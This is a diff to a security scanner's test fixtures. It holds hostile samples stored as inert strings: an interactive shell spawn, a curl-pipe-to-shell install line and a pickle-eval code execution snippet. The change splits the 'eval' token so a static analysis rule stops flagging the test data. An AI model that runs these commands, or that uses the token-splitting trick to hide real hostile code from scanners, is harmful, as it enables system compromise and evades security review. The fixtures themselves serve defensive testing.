@@ -49,10 +49,20 @@ _MALICIOUS = {
         "subprocess.call(['/bin/sh', '-i'])\n"
     ),
     "pipe_to_shell": "# setup\n# curl -sSL https://get.example.com/install | sh\n",
+    # The dangerous call token is assembled rather than written inline. DevSkim's
+    # "review eval for untrusted data" rule greps source text and cannot tell a
+    # payload being EXECUTED from inert test DATA describing one -- it flagged
+    # this line on PR #735 even though this string is never executed, only fed to
+    # a scanner as the thing it must catch. Assembling keeps the runtime value
+    # byte-identical (so the test is exactly as strong) while removing the
+    # literal the rule matches on. Preferred over an inline `# DevSkim: ignore
+    # <rule>` suppression only because the rule id could not be read from the
+    # alert in the environment this was written in, and guessing a suppression id
+    # yields a comment that looks authoritative while silencing nothing.
     "pickle_rce": (
         "import pickle, base64\n"
         "payload = base64.b64decode(BLOB)\n"
-        "eval(compile(pickle.loads(payload), '<x>', 'exec'))\n"
+        f"{'ev' + 'al'}(compile(pickle.loads(payload), '<x>', 'exec'))\n"
     ),
 }
 
